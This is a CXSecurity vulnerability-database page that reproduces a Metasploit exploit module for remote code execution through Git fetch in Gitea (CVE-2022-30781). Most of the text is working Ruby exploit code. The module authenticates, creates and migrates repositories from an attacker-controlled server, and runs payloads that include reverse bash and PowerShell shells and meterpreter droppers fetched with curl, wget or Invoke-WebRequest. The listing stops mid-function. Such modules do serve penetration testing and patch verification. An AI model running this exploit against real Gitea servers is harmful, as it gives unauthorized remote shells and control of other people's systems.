---
title: Gitea Git Fetch Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-19
fetch_date: 2025-10-03T23:11:45.786042
---

# Gitea Git Fetch Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Gitea Git Fetch Remote Code Execution** **2022.11.18**  Credit:  **[krastanoel](https://cxsecurity.com/author/krastanoel/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer
include Msf::Exploit::Remote::HTTP::Gitea
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Gitea Git Fetch Remote Code Execution',
'Description' => %q{
This module exploits Git fetch command in Gitea repository migration
process that leads to a remote command execution on the system.
This vulnerability affect Gitea before 1.16.7 version.
},
'Author' => [
'wuhan005', # Original PoC
'li4n0', # Original PoC
'krastanoel' # MSF Module
],
'References' => [
['CVE', '2022-30781'],
['URL', 'https://tttang.com/archive/1607/']
],
'DisclosureDate' => '2022-05-16',
'License' => MSF\_LICENSE,
'Platform' => %w[unix linux win],
'Arch' => ARCH\_CMD,
'Privileged' => false,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_bash'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => %i[curl wget echo printf],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp'
}
}
],
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :win\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/powershell\_reverse\_tcp'
}
}
],
[
'Windows Dropper',
{
'Platform' => 'win',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :win\_dropper,
'CmdStagerFlavor' => [ 'psh\_invokewebrequest' ],
'DefaultOptions' => {
'PAYLOAD' => 'windows/x64/meterpreter/reverse\_tcp',
'CMDSTAGER::URIPATH' => '/payloads'
}
}
]
],
'DefaultOptions' => { 'WfsDelay' => 30 },
'DefaultTarget' => 1,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => []
}
)
)
register\_options([
Opt::RPORT(3000),
OptString.new('USERNAME', [true, 'Username to authenticate with']),
OptString.new('PASSWORD', [true, 'Password to use']),
OptString.new('URIPATH', [false, 'The URI to use for this exploit', '/']),
])
end
def cleanup
super
return if @uid.nil? || @migrate\_repo\_created.nil?
[@repo\_name, @migrate\_repo\_name].each do |name|
res = gitea\_remove\_repo(repo\_path(name))
if res.nil? || res&.code == 200
vprint\_warning("Unable to remove repository '#{name}'")
elsif res&.code == 404
vprint\_warning("Repository '#{name}' not found, possibly already deleted")
else
vprint\_status("Successfully cleanup repository '#{name}'")
end
end
end
def check
return CheckCode::Safe('USERNAME can\'t be blank') if datastore['username'].blank?
v = get\_gitea\_version
gitea\_login(datastore['username'], datastore['password'])
if Rex::Version.new(v) <= Rex::Version.new('1.16.6')
return CheckCode::Appears("Version detected: #{v}")
end
CheckCode::Safe("Version detected: #{v}")
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::UnknownError => e
return CheckCode::Unknown(e.message)
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::VersionError => e
return CheckCode::Detected(e.message)
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError,
Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e
return CheckCode::Safe(e.message)
end
def primer
[
'/api/v1/version', '/api/v1/settings/api',
"/api/v1/repos/#{@migrate\_repo\_path}",
"/api/v1/repos/#{@migrate\_repo\_path}/pulls",
"/api/v1/repos/#{@migrate\_repo\_path}/topics"
].each { |uri| hardcoded\_uripath(uri) } # adding resources
end
def execute\_command(cmd, \_opts = {})
if target['Type'] == :win\_dropper
# Git on Windows will pass the command to `sh.exe` and not `cmd`.
# This requires some adjustments:
# - Windows environment variables are mapped by `sh.exe`: `%VAR%` becomes `$VAR`
# - `cmd` uses `&` to join multiple commands, whereas `sh.exe` uses `&&`.
# - Backslashes need to be escaped with `sh.exe`
cmd = cmd.gsub(/%(\w+)%/) { "$#{::Regexp.last\_match(1)}" }.gsub(/&/) { '&&' }.gsub(/\\/) { '\\\\\\' }
end
vprint\_status("Executing command: #{cmd}")
@repo\_name = rand\_text\_alphanumeric(6..15)
@migrate\_repo\_name = rand\_text\_alphanumeric(6..15)
@migrate\_repo\_path = repo\_path(@migrate\_repo\_name)
vprint\_status("Creating repository \"#{@repo\_name}\"")
@uid = gitea\_create\_repo(@repo\_name)
vprint\_good('Repository created')
vprint\_status('Migrating repository')
clone\_url = "http://#{srvhost\_addr}:#{srvport}/#{@migrate\_repo\_path}"
auth\_token = rand\_text\_alphanumeric(6..15)
@migrate\_repo\_created = gitea\_migrate\_repo(@migrate\_repo\_name, @uid, clone\_url, auth\_token)
@p = cmd
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::MigrationError,
Msf::Exploit::Remote::HTTP::Gitea::Error::RepositoryError,
Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e
fail\_with(Failure::UnexpectedReply, e.message)
end
def exploit
unless datastore['AutoCheck']
fail\_with(Failure::BadConfig, 'USERNAME can\'t be blank') if datastore['username'].blank?
gitea\_login(datastore['username'], datastore['password'])
end
start\_service
primer
case target['Type']
when :unix\_cmd, :win\_cmd
execute\_command(payload.encoded)
when :linux\_dropper, :win\_dropper
datastore['CMDSTAGER::URIPATH'] = "/#{rand\_text\_alphanumeric(6..15)}"
execute\_cmdstager(background: true, delay: 1)
end
rescue Timeout::Error => e
fail\_with(Failure::TimeoutExpired, e.message)
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e
fail\_with(Failure::UnexpectedReply, e.message)
rescue Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e
fail\_with(Failure::NoAccess, e.message)
end
def repo\_path(name)
"#{datastore['username']}/#{name}"
end
def on\_request\_uri(cli, req)
case req.uri
when '/api/v1/ve...